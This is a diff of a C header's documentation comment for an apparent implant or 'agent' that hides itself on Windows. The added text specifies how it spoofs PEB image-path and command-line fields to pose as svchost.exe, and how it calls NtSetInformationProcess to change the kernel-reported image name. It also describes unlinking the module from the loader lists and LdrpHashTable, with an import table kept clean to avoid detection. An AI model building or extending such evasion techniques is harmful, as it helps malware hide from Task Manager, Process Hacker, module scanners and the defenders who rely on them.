@@ -5,25 +5,37 @@
  * to casual inspection.  All are no-ops on failure — the agent continues
  * running even if a spoof call is denied.
  *
+ * All three functions are IAT-clean:
+ *   GetModuleHandleA / GetProcAddress / __readgsqword / __readfsdword are
+ *   NOT called.  ntdll is resolved via peb_get_module(); function pointers
+ *   via peb_get_export(); the PEB via inline asm segment reads.
+ *
  *  spoof_peb()
- *      Overwrites RTL_USER_PROCESS_PARAMETERS.ImagePathName and .CommandLine
- *      so tools that read the PEB (Task Manager command-line column,
- *      Process Hacker Properties > Image) see a benign svchost.exe path.
+ *      Overwrites three PEB fields:
+ *        ProcessParameters.ImagePathName — seen by Task Manager / ProcExp
+ *        ProcessParameters.CommandLine   — command-line column
+ *        peb->ImageBaseAddress           — base→name resolver in PH/ProcExp
+ *      String buffers live in writable .data (not .rdata) so a runtime
+ *      obfuscation pass can encode them without linker changes.
+ *      PEB pointer is read via inline asm (no __readgsqword/__readfsdword).
  *
  *  spoof_kernel_image()
- *      Calls NtSetInformationProcess with two information classes:
- *        Class 49 (ProcessImageFileName, Vista+)    — NT-path form
+ *      Calls NtSetInformationProcess (resolved via PEB walk) with:
+ *        Class 49 (ProcessImageFileName, Vista+)    — Win32-path form
  *        Class 74 (ProcessImageFileNameWin32, Win8.1+) — Win32-path form
- *      Class 74 is the value that modern Task Manager and Process Hacker
- *      on Windows 10/11 display in the "Image" column.  Both calls are
- *      attempted; failure of either is a silent no-op.
+ *      Both classes are attempted; failure of either is a silent no-op.
+ *      No GetModuleHandleA / GetProcAddress in the call chain.
  *
  *  unlink_self_from_ldr()
- *      Removes the current module's LDR_DATA_TABLE_ENTRY from the three
- *      PEB loader lists so in-process module scanners cannot find us.
- *      Version-aware: on Windows 8+ (build >= 9200) only InLoadOrder and
- *      InMemoryOrder are touched (InInitializationOrder is absent for EXEs
- *      on those builds).  Silent no-op on any failure.
+ *      Removes the EXE's LDR_DATA_TABLE_ENTRY from the three PEB loader
+ *      lists AND from the LdrpHashTable bucket chain so both list-walk and
+ *      hash-table enumeration cannot find us.
+ *        InLoadOrderModuleList       — always unlinked
+ *        InMemoryOrderModuleList     — always unlinked
+ *        InInitializationOrderList   — only on pre-Win8 (build < 9200)
+ *        HashLinks (LdrpHashTable)   — always cleared
+ *      Build number is read from PEB->OSBuildNumber (no RtlGetVersion call).
+ *      Self-base from PEB->ImageBaseAddress (no GetModuleHandleA(NULL)).
  */
 
 #pragma once
